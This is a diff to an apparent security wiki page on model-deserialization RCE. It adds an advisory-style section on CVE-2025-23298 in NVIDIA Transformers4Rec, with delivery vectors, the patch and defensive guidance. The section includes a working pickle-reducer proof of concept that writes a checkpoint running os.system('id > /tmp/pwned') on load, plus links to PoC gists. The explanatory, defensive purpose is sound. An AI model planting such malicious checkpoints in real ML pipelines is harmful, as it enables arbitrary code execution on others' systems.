@@ -12,6 +12,7 @@ At the time of the writting these are some examples of this type of vulneravilit
 |-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
 | **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
 | PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
+| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
 | **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
 | TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
 | **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
@@ -101,6 +102,51 @@ location /api/v2/models/install {
     allow 10.0.0.0/8;               # only internal CI network can call it
 }
 ```
+
+### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)
+
+NVIDIA’s Transformers4Rec (part of Merlin) exposed an unsafe checkpoint loader that directly called `torch.load()` on user-provided paths. Because `torch.load` relies on Python `pickle`, an attacker-controlled checkpoint can execute arbitrary code via a reducer during deserialization.
+
+Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.
+
+Why this leads to RCE: In Python pickle, an object can define a reducer (`__reduce__`/`__setstate__`) that returns a callable and arguments. The callable is executed during unpickling. If such an object is present in a checkpoint, it runs before any weights are used.
+
+Minimal malicious checkpoint example:
+
+```python
+import torch
+
+class Evil:
+    def __reduce__(self):
+        import os
+        return (os.system, ("id > /tmp/pwned",))
+
+# Place the object under a key guaranteed to be deserialized early
+ckpt = {
+    "model_state_dict": Evil(),
+    "trainer_state": {"epoch": 10},
+}
+
+torch.save(ckpt, "malicious.ckpt")
+```
+
+Delivery vectors and blast radius:
+- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
+- Automated resume/deploy pipelines that auto-load checkpoints
+- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)
+
+Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.
+
+Defensive guidance specific to PyTorch checkpoints:
+- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
+- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
+- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
+- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.
+
+POC and vulnerable/patch references:
+- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
+- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
+- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js
 
 ## Example – crafting a malicious PyTorch model
 
@@ -192,5 +238,12 @@ For a focused guide on .keras internals, Lambda-layer RCE, the arbitrary import 
 - [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
 - [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
 - [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
+- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
+- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
+- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
+- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
+- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
+- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
+- [Hugging Face Transformers](https://github.com/huggingface/transformers)
 
 {{#include ../banners/hacktricks-training.md}}
